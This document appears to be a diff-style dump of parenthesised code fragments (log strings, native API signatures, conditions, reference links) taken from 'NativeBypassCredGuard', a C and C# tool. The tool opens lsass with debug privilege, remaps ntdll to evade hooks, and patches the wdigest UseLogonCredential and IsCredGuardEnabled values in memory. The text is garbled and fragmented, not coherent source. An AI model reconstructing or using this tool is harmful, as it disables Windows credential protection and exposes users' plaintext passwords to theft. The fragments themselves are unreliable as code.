@@ -1,0 +1,502 @@
+"(!VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection"
+"("" """
+"("""""
+"(""%02X "", matchedBytes[i]"
+"(""1.0.*"""
+"(""1.0.0.0"""
+"(""C#"""
+"(""Failed to write memory. Error code: %lu\n"", GetLastError("
+"(""Not a valid PE file."""
+"(""Not a valid PE file.\n"""
+"(""Pattern not found."""
+"(""Pattern not found.\n"""
+"(""X"""
+"(""[+] DLL Base Address: \t\t0x%llX\n"", (unsigned long long"
+"(""[+] DLL remap completed:\tCopied "" + localNtdllTxtSize + "" bytes from 0x"" + unhookedNtdllTxt.ToString(""X"""
+"(""[+] DLL remap completed:\tCopied %d bytes from 0x%llX to 0x%llX\n"", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt"
+"(""[+] DLL remap:\t\t\ttrue\n"""
+"(""[+] Debug messages:\t\t%s\n"", debug ? ""true"" : ""false"""
+"(""[+] Enable SeDebugPrivilege: \tOK"""
+"(""[+] Enable SeDebugPrivilege: \tOK\n"""
+"(""[+] File Handle:\t\t%lld\n"", (intptr_t"
+"(""[+] InInitializationOrderModuleList:\t\t0x"" + InInitializationOrderModuleList.ToString(""X"""
+"(""[+] IsCredGuardEnabled address:\t0x%llX (0x%llX + 0x%X"
+"(""[+] IsCredGuardEnabled offset: \t0x%X (0x%X + offset +  6"
+"(""[+] Lsass Handle:\t\t%lld\n"", (long long"
+"(""[+] Matched Bytes: \t\t"""
+"(""[+] Offset: \t\t\t0x%X\n"", offset"
+"(""[+] PEB Address: \t\t0x"" + pbi_addr.ToString(""X"""
+"(""[+] Usage:\n    NativeBypassCredGuard.exe <OPTION> <REMAPNTDLL>\n\n    OPTION:\n        - 'check': Read current values.\n        - 'patch': Write new values.\n\n    REMAPNTDLL:\n        - true: Remap the ntdll library.\n        - false (or omitted"
+"(""[+] UseLogonCredential address:\t0x%llX (0x%llX + 0x%X"
+"(""[+] UseLogonCredential offset: \t0x%X (0x%X + offset +  6"
+"(""[+] UseLogonCredential value: \t%02X %02X %02X %02X\n"", useLogonCredential_buffer[0], useLogonCredential_buffer[1], useLogonCredential_buffer[2], useLogonCredential_buffer[3]"
+"(""[+] Wrote value %d to address: \t0x%llX (isCredGuardEnabled"
+"(""[+] Wrote value %d to address: \t0x%llX (useLogonCredential"
+"(""[+] isCredGuardEnabled value: \t%02X %02X %02X %02X\n"", isCredGuardEnabled_buffer[0], isCredGuardEnabled_buffer[1], isCredGuardEnabled_buffer[2], isCredGuardEnabled_buffer[3]"
+"(""[-] Error calling CloseHandle"""
+"(""[-] Error calling CreateProcess"""
+"(""[-] Error calling CreateProcess\n"""
+"(""[-] Error calling DebugActiveProcessStop or TerminateProcess\n"""
+"(""[-] Error calling DebugActiveProcessStop"""
+"(""[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x"" + ntstatus.ToString(""X"""
+"(""[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue.\n"", ntstatus"
+"(""[-] Error calling NtClose\n"""
+"(""[-] Error calling NtOpenProcessToken. NTSTATUS: 0x"" + ntstatus.ToString(""X"""
+"(""[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n"", ntstatus"
+"(""[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY"
+"(""[-] Error calling NtProtectVirtualMemory (dwOldProtection"
+"(""[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x"" + ntstatus.ToString(""X"""
+"(""[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n"", ntstatus"
+"(""[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr"
+"(""[-] Error calling NtReadVirtualMemory (ReadRemoteUintptr_t"
+"(""[-] Error calling NtReadVirtualMemory (ReadRemoteWStr"
+"(""[-] Error calling NtReadVirtualMemory"""
+"(""[-] Error calling NtReadVirtualMemory\n"""
+"(""[-] Error calling NtTerminateProcess. NTSTATUS:"" + terminateproc_res.ToString(""X"""
+"(""[-] Error reading BaseOfCode\n"""
+"(""[-] Error reading DOS header signature\n"""
+"(""[-] Error reading NT header signature\n"""
+"(""[-] Error reading Optional Header Magic\n"""
+"(""[-] Error reading SizeOfCode\n"""
+"(""[-] Error reading e_lfanew\n"""
+"(""[-] Failed to parse PE file.\n"""
+"(""[-] Failed to read DLL.\n"""
+"(""[-] File must be compiled as 64-bit binary.\n"""
+"(""[-] File must be compiled as 64-byte binary."""
+"(""[-] Incorrect DOS header signature"""
+"(""[-] Incorrect DOS header signature\n"""
+"(""[-] Incorrect NT header signature"""
+"(""[-] Incorrect NT header signature\n"""
+"(""[-] Incorrect Optional Header Magic field value"""
+"(""[-] Incorrect Optional Header Magic field value\n"""
+"(""[-] It was not possible to get lsass handle."""
+"(""[-] PEB structure is not readable."""
+"(""[-] PEB structure is not readable.\n"""
+"(""\n"""
+"(""check"", debug"
+"(""e383dfea-ec22-4667-9434-3f2591a03740"""
+"(""kernel32.dll"""
+"(""kernel32.dll"", CharSet = CharSet.Unicode, SetLastError = true"
+"(""ntdll.dll"""
+"(""patch"", debug"
+"(""wdigest.dll"""
+"(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"""
+"(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"""
+"($""Error: {ex.Message}"""
+"($""Failed to open file handle. NTSTATUS: 0x{status.ToString(""X"""
+"($""Failed to read file. NTSTATUS: 0x{status.ToString(""X"""
+"($""Failed to write memory. Error code: {Marshal.GetLastWin32Error("
+"($""[+] DLL Base Address:\t\t0x{hModule.ToInt64("
+"($""[+] DLL remap:\t\t\tTrue"""
+"($""[+] Debug messages:\t\t{debug}"""
+"($""[+] File Handle:\t\t{fileHandle}"""
+"($""[+] IsCredGuardEnabled address:\t0x{isCredGuardEnabled_Address.ToInt64("
+"($""[+] IsCredGuardEnabled offset:\t0x{(isCredGuardEnabled + offset + 12"
+"($""[+] IsCredGuardEnabled value: \t{isCredGuardEnabled_buffer[0]:X2} {isCredGuardEnabled_buffer[1]:X2} {isCredGuardEnabled_buffer[2]:X2} {isCredGuardEnabled_buffer[3]:X2}"""
+"($""[+] Lsass Handle:\t\t{lsassHandle}"""
+"($""[+] Matched bytes:\t\t"""
+"($""[+] Offset:\t\t\t0x{offset:X}"""
+"($""[+] UseLogonCredential address:\t0x{useLogonCredential_Address.ToInt64("
+"($""[+] UseLogonCredential offset:\t0x{(useLogonCredential + offset + 6"
+"($""[+] UseLogonCredential value: \t{useLogonCredential_buffer[0]:X2} {useLogonCredential_buffer[1]:X2} {useLogonCredential_buffer[2]:X2} {useLogonCredential_buffer[3]:X2}"""
+"($""[+] Wrote value {isCredGuardEnabled_Value} to address: \t0x{isCredGuardEnabled_Address.ToInt64("
+"($""[+] Wrote value {useLogonCredential_Value} to address: \t0x{useLogonCredential_Address.ToInt64("
+"($""{matchedBytes[l]:X2} """
+"((NtReadVirtualMemory(hProcess, (BYTE*"
+"((NtReadVirtualMemory(hProcess, ntdll_address, signature_dos_header, 2, &bytesRead"
+"(BYTE* buffer, size_t bufferSize, int* offset, int* useLogonCredential, int* isCredGuardEnabled, BYTE* matchedBytes"
+"(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key"
+"(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten"
+"(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect"
+"(HANDLE ProcessHandle, int ExitStatus"
+"(HANDLE hProcess, PVOID mem_address"
+"(HANDLE hProcess, const char* dll_name"
+"(HANDLE processHandle, LPVOID address, uint32_t value"
+"(HANDLE processHandle, void* address, BYTE* buffer, SIZE_T bufferLength"
+"(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE"
+"(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID"
+"(HANDLE, DWORD, PHANDLE"
+"(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG"
+"(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T"
+"(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, byte[] Buffer, uint Length, ref LARGE_INTEGER ByteOffset, IntPtr Key"
+"(IntPtr ProcessHandle, int ExitStatus"
+"(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, out uint OldProtect"
+"(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle"
+"(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength"
+"(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead"
+"(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint dwSize, out uint lpNumberOfBytesRead"
+"(IntPtr hProcess, IntPtr mem_address"
+"(IntPtr hProcess, String dll_name"
+"(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle"
+"(IntPtr processHandle, IntPtr address, out byte[] buffer"
+"(IntPtr processHandle, IntPtr address, uint value"
+"(IntPtr processHandle, IntPtr baseAddress, ref uint buffer, uint bufferSize, out uint bytesWritten"
+"(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength"
+"(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize"
+"(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize"
+"(NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle"
+"(NULL, ""SeDebugPrivilege"", &luid"
+"(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle"
+"(NtReadVirtualMemory(processHandle, address, buffer, (uint"
+"(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength"
+"(argc == 3 && strcmp(argv[2], ""true"""
+"(as explained in the first post in the References section, the pattern is present in this file in all Windows versions"
+"(buff, 0"
+"(buff, i"
+"(buffer, 0x3C"
+"(buffer, peHeaderOffset + 20"
+"(buffer, peHeaderOffset + 6"
+"(buffer, peHeaderOffset"
+"(buffer, sectionOffset + 12"
+"(buffer, sectionOffset + 16"
+"(buffer, sectionOffset + 20"
+"(buffer, sectionOffset, 8"
+"(byte[] buffer, out int offset, out int useLogonCredential, out int isCredGuardEnabled, out byte[] matchedBytes"
+"(const char* option, bool debug"
+"(const wchar_t* filePath, HANDLE* fileHandle"
+"(currentProcess, ""ntdll.dll"""
+"(currentProcess, &localNtdllTxt, &aux, 0x80, &dwOldProtection"
+"(currentProcess, &localNtdllTxt, &aux, dwOldProtection, &dwOldProtection"
+"(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle"
+"(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle"
+"(currentProcess, ref localNtdllTxt, ref localNtdllTxtSizeUint, PAGE_EXECUTE_WRITECOPY, out dwOldProtection"
+"(currentProcess, ref localNtdllTxt, ref localNtdllTxtSizeUint, dwOldProtection, out dwOldProtection"
+"(currentProcess, targetDll"
+"(current_proc_name && strcmp(current_proc_name, proc_name"
+"(data, 0"
+"(fileBuffer, 1024 * 1024, &offset, &useLogonCredential, &isCredGuardEnabled, matchedBytes"
+"(fileBytes, out int offset, out int useLogonCredential, out int isCredGuardEnabled, out byte[] matchedBytes"
+"(filePath, &fileHandle"
+"(filePath, out fileHandle"
+"(hNtdll, ""NtAdjustPrivilegesToken"""
+"(hNtdll, ""NtClose"""
+"(hNtdll, ""NtCreateFile"""
+"(hNtdll, ""NtGetNextProcess"""
+"(hNtdll, ""NtOpenProcessToken"""
+"(hNtdll, ""NtProtectVirtualMemory"""
+"(hNtdll, ""NtQueryInformationProcess"""
+"(hNtdll, ""NtReadFile"""
+"(hNtdll, ""NtTerminateProcess"""
+"(hNtdll, ""NtWriteVirtualMemory"""
+"(hProcess, (BYTE*"
+"(hProcess, (next_flink + 0x10"
+"(hProcess, (next_flink + flink_buffer_offset"
+"(hProcess, (next_flink + flink_dllbase_offset"
+"(hProcess, (void*"
+"(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength"
+"(hProcess, InInitializationOrderModuleList"
+"(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength"
+"(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal"
+"(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA"
+"(hProcess, baseofcode_addr, data, data.Length, out _"
+"(hProcess, buffer"
+"(hProcess, e_lfanew_addr, data, 4, out _"
+"(hProcess, functionAddressRA, functionName, strlen(func_name"
+"(hProcess, image_nt_headers_addr, data, data.Length, out _"
+"(hProcess, ldr_pointer"
+"(hProcess, mem_address, buff, (uint"
+"(hProcess, mem_address, buff, sizeof(buff"
+"(hProcess, mem_address, buff, sizeof(uintptr_t"
+"(hProcess, optional_headers_addr, data, data.Length, out _"
+"(hProcess, signature_addr, data, data.Length, out _"
+"(hProcess, sizeofcode_addr, data, data.Length, out _"
+"(int argc, char* argv[]"
+"(localNtdllTxt, unhookedNtdllTxt, localNtdllTxtSize"
+"(lsassHandle, (void*"
+"(lsassHandle, dllName"
+"(lsassHandle, isCredGuardEnabled_Address, isCredGuardEnabled_Value"
+"(lsassHandle, isCredGuardEnabled_Address, out byte[] isCredGuardEnabled_buffer"
+"(lsassHandle, useLogonCredential_Address, out byte[] useLogonCredential_buffer"
+"(lsassHandle, useLogonCredential_Address, useLogonCredential_Value"
+"(matchedBytes, 0, 18"
+"(null, ""SeDebugPrivilege"", ref luid"
+"(option == ""patch"""
+"(out IntPtr FileHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, out IO_STATUS_BLOCK IoStatusBlock, IntPtr AllocationSize, uint FileAttributes, uint ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength"
+"(pi.hProcess, 0"
+"(pi.hProcess, localNtdllTxt, ntdllBuffer, ntdllBuffer.Length, out _"
+"(processHandle, address, buffer, bufferLength, &bytesRead"
+"(process_handle, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength"
+"(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength"
+"(process_handle, commandline_address"
+"(process_handle, commandline_pointer"
+"(process_handle, processparameters_pointer"
+"(process_path, null, IntPtr.Zero, IntPtr.Zero, false, DEBUG_PROCESS, IntPtr.Zero, null, ref si, out pi"
+"(sectionName == "".text"""
+"(sectionName, buffer + sectionOffset, 8"
+"(signature_dos_header != ""MZ"""
+"(signature_nt_header != ""PE"""
+"(stderr, ""Failed to allocate memory for fileBytes.\n"""
+"(stderr, ""Failed to open file handle. NTSTATUS: 0x%08X\n"", status"
+"(stderr, ""Failed to read file. NTSTATUS: 0x%08X\n"", status"
+"(strcmp(base_dll_name, dll_name"
+"(strcmp(firstArg, ""check"""
+"(strcmp(firstArg, ""patch"""
+"(strcmp(functionName, func_name"
+"(strcmp(sectionName, "".text"""
+"(string filePath, out IntPtr fileHandle"
+"(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation"
+"(string option, bool debug"
+"(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES"
+"(tokenHandle, false, ref tokenPrivileges, (uint"
+"(unhookedNtdllTxt, localNtdllTxt, localNtdllTxtSize"
+"(unicodeString, objectAttributes.ObjectName, false"
+"(void* pDosHdr, const char* func_name"
+(!Environment.Is64BitProcess
+(!createprocess_res
+(!debugstop_res || (terminateproc_res != 0
+(!fileBytes
+(!is64BitProcess(
+(!parse_bool
+('$(MSBuildExtensionsPath
+('$(UserRootDir
+('\0'
+(((NTSTATUS
+((BYTE*
+((DWORD_PTR
+((HMODULE
+((LPVOID
+((filePath.Length + 1
+((l + 1
+((long long
+((uintptr_t
+((unsigned char
+((void*
+((wcslen(filePath
+()
+(**with** ntdll remapping
+(**without** ntdll remapping
+(*p
+(*str
+(-1
+(0
+(0x{hModule.ToInt64(
+(0x{isCredGuardEnabled:X6} + Offset + 12
+(0x{useLogonCredential:X6} + Offset +  6
+(1 byte
+(1024 * 1024
+(2 bytes
+(4 byte
+(4 bytes
+(8-bytes
+(BYTE*
+(Configuration
+(DWORD_PTR
+(Exception ex
+(ExtensibilityGlobals
+(HANDLE
+(HANDLE fileHandle
+(HANDLE process_handle
+(IMAGE_DATA_DIRECTORY
+(IMAGE_DOS_HEADER
+(IMAGE_EXPORT_DIRECTORY
+(IMAGE_FILE_HEADER
+(IMAGE_NT_HEADERS
+(IMAGE_OPTIONAL_HEADER64
+(IntPtr
+(IntPtr currentProcess
+(IntPtr fileHandle
+(IntPtr hObject
+(IntPtr ntdl_address
+(IntPtr process_handle
+(LPCSTR process_path
+(LPVOID
+(LPVOID ntdll_address
+(LayoutKind.Explicit
+(LayoutKind.Sequential
+(MSBuildExtensionsPath
+(MSBuildToolsPath
+(MSBuildToolsVersion
+(Marshal.SizeOf<UNICODE_STRING>(
+(NtAdjustPrivilegesTokenFn
+(NtCloseFn
+(NtCreateFileFn
+(NtGetNextProcessFn
+(NtOpenProcessTokenFn
+(NtProtectVirtualMemoryFn
+(NtQueryInformationProcessFn
+(NtReadFileFn
+(NtReadVirtualMemoryFn
+(NtTerminateProcessFn
+(NtWriteVirtualMemoryFn
+(OBJECT_ATTRIBUTES
+(PVOID
+(PVOID*
+(PWSTR
+(Platform
+(PreprocessorDefinitions
+(ProjectConfigurationPlatforms
+(STARTUPINFOA
+(STATUS_PENDING
+(SolutionConfigurationPlatforms
+(SolutionProperties
+(Status
+(USHORT
+(UserRootDir
+(VCTargetsPath
+(WINAPI* NtAdjustPrivilegesTokenFn
+(WINAPI* NtCloseFn
+(WINAPI* NtCreateFileFn
+(WINAPI* NtGetNextProcessFn
+(WINAPI* NtOpenProcessTokenFn
+(WINAPI* NtProtectVirtualMemoryFn
+(WINAPI* NtQueryInformationProcessFn
+(WINAPI* NtReadFileFn
+(WINAPI* NtReadVirtualMemoryFn
+(WINAPI* NtTerminateProcessFn
+(WINAPI* NtWriteVirtualMemoryFn
+(addressOfFunctionsVRA_value
+(addressOfNameOrdinalsVRA_value
+(addressOfNamesVRA_value
+(argc < 2
+(args.Length == 0
+(args.Length == 2
+(args[1].ToLower(
+(aux_handle
+(bool debug
+(buff[i] == 0 && buff[i + 1] == 0
+(buffer + 0x3C
+(buffer + peHeaderOffset
+(buffer + peHeaderOffset + 20
+(buffer + peHeaderOffset + 6
+(buffer + sectionOffset + 12
+(buffer + sectionOffset + 16
+(buffer + sectionOffset + 20
+(buffer[j + 10] << 16
+(buffer[j + 3] << 8
+(buffer[j + 4] << 16
+(buffer[j + 9] << 8
+(buffer[j] == 0x39 && buffer[j + 5] == 0x00 && buffer[j + 6] == 0x8b && buffer[j + 11] == 0x00
+(byte* p = ntdllBuffer
+(byte* p = pbi_byte_array
+(bytesReadProcess == 4
+(char
+(char* p = firstArg; *p; ++p
+(char* str
+(closehandle_proc != 0 || closehandle_thread != 0
+(const char* proc_name
+(currentProcess
+(current_proc_name
+(current_proc_name == proc_name
+(data
+(debug
+(debug && openfile_bool
+(debug && privilege_bool
+(debug && readval_icge_bool
+(debug && readval_ulcr_bool
+(debug && setval_bool
+(debugstop_res != true
+(dll_base != IntPtr.Zero
+(dll_base != NULL
+(dll_name.ToLower(
+(e_lfanew_value
+(exportTableRVA_value
+(exportTableRVA_value != 0
+(exported by ntdll.dll
+(false
+(fileBuffer
+(fileBuffer == NULL
+(fileBytes
+(fileHandle
+(fileHandle != IntPtr.Zero && fileHandle.ToInt64(
+(fileHandle != NULL
+(filePath
+(filePath.Length * 2
+(firstArg
+(functionAddress
+(https://blog.xpnsec.com/exploring-mimikatz-part-1/
+(https://github.com/0x3rhy
+(https://github.com/0x3rhy/BypassCredGuard-BOF
+(https://itm4n.github.io/credential-guard-bypass/
+(https://neuralhax.github.io/wdigest-digging-the-dead-from-the-grave
+(https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativebypasscredguard/Screenshot_1.png
+(https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativebypasscredguard/Screenshot_2.png
+(https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativebypasscredguard/esquema.png
+(https://twitter.com/neuralhax
+(https://x.com/_xpn_
+(https://x.com/itm4n
+(i * 40
+(int
+(int dwProcessId
+(int i = 0; i < (int
+(int i = 0; i < 18; i++
+(int i = 0; i < buff.Length - 1; i += 2
+(int i = 0; i < numberOfSections; i++
+(int i = 0; i < sizeof(buff
+(int j = (int
+(int k = j; k < j + 18 && k < buffer.Length; k++
+(int l = 0; l < 18; l++
+(int32_t*
+(isCredGuardEnabled
+(isCredGuardEnabled + offset + 12
+(j + 11 >= bufferSize
+(j + 5 < buffer.Length
+(j + 5 < bufferSize
+(ldr_adress == IntPtr.Zero
+(localNtdllHandle
+(localNtdllTxtSize
+(long long
+(long long*
+(lsassHandle == 0
+(lsassHandle == IntPtr.Zero
+(ntdllBuffer
+(ntstatus != 0
+(ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero
+(ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL
+(ntstatus != 0 || bytesWritten != sizeof(uint
+(ntstatus != 0 || bytesWritten != sizeof(uint32_t
+(ntstatus == 0 && bytesRead == bufferLength
+(numberOfNames_value
+(openfile_bool && debug
+(optional
+(optional_header_magic != 0x20B && optional_header_magic != 0x10B
+(or omitted
+(peSignature != 0x00004550
+(peb_pointer
+(pi.dwProcessId
+(pi.hProcess
+(pi.hThread
+(privilege_bool && debug
+(proc_name
+(proc_path
+(process_path
+(readprocmem_res != 0
+(required
+(si
+(signature_dos_header[0] != 'M' || signature_dos_header[1] != 'Z'
+(signature_nt_header[0] != 'P' || signature_nt_header[1] != 'E'
+(sizeopthdr_value
+(status != 0
+(status != 0 && status != 0x103
+(string proc_name
+(string process_path
+(string[] args
+(terminateproc_res != 0
+(to 0
+(to 1
+(tokenHandle
+(tokenHandle != IntPtr.Zero
+(tokenHandle != NULL
+(typeof(IMAGE_FILE_HEADER
+(typeof(TOKEN_PRIVILEGES
+(typeof(UInt32
+(uint
+(uint16_t*
+(uint32_t
+(uint32_t j = rawDataPointer; j < rawDataPointer + rawDataSize - 11; j++
+(uint32_t k = j; k < j + 18 && k < bufferSize; k++
+(uint32_t*
+(uintptr_t
+(uintptr_t*
+(unsigned long long
+(useLogonCredential
+(useLogonCredential + offset + 6
+(ushort
+(void*
+(void**
+(vp_res != 0
+(vp_res2 != 0
+(vp_res_2 != 0
+(wchar_t
+(wchar_t*
+(wcslen(filePath
+(you have the code for this commented in the C version
